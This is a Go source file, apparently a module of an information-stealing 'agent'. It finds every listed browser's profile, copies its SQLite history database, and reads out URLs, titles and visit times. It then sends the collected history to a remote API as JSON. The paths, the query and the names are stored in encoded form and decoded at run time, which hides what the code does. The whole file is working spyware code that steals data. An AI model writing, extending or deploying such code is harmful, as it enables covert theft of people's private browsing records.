package modules

import (
	"agent/api"
	"agent/lib"
	"agent/vars"
	"database/sql"
	"os"
	"path"
	"sync"

	_ "github.com/mattn/go-sqlite3"
)

func readHistory(p string, bp string) []vars.THistory {
	var (
		res  []vars.THistory
		rows *sql.Rows = nil
		db   *sql.DB   = nil
	)

	temp := lib.CopyTemp(p)
	if temp == "" {
		return res
	}

	db, err := sql.Open("sqlite3", temp)
	if err != nil {
		goto DONE
	}

	rows, err = db.Query(lib.Decode(vars.Query_history))
	if err != nil {
		lib.Print(vars.Msg_DumpError,
			lib.Decode(vars.Module_history), err.Error())
		goto DONE
	}

	for rows.Next() {
		var history vars.THistory
		err := rows.Scan(&history.URL, &history.Title, &history.LastVisit)
		if err != nil {
			continue
		}

		res = append(res, history)
	}

DONE:
	if rows != nil {
		rows.Close()
	}

	if db != nil {
		db.Close()
	}

	lib.CleanTemp(temp)
	return res
}

func dumpHistory(b vars.Browser) ([]vars.THistory, error) {
	var res []vars.THistory
	dec := lib.Decode(b.Path)

	if dec == "" {
		return res, lib.NewErr(vars.Msg_BadEnc)
	}

	fp := path.Join(os.Getenv(lib.Decode(b.Prefix)), dec)
	history := lib.FindFiles(fp, lib.Decode(vars.Path_history), false)

	for _, h := range history {
		res = append(res, readHistory(h, fp)...)
	}

	for i := range res {
		res[i].From = lib.Decode(b.Name)
	}

	return res, nil
}

func GetHistory(wg *sync.WaitGroup) {
	for _, b := range vars.Browsers {
		cs, err := dumpHistory(b)
		if err != nil {
			lib.Print(vars.Msg_DumpError,
				lib.Decode(vars.Module_history), err.Error())
		}
		vars.Agent.History = append(vars.Agent.History, cs...)
	}

	lib.Print(vars.Msg_Entries,
		lib.Decode(vars.Module_history), len(vars.Agent.History))
	err := api.SendJSON(lib.Decode(vars.Module_history), struct {
		History []vars.THistory `json:"ST_MAP$json.history_data$"`
	}{
		History: vars.Agent.History,
	})

	if err != nil {
		lib.Print(vars.Msg_FailSend,
			lib.Decode(vars.Module_history), err.Error())
	}

	lib.Print(vars.Msg_Done, lib.Decode(vars.Module_history))
	wg.Done()
}
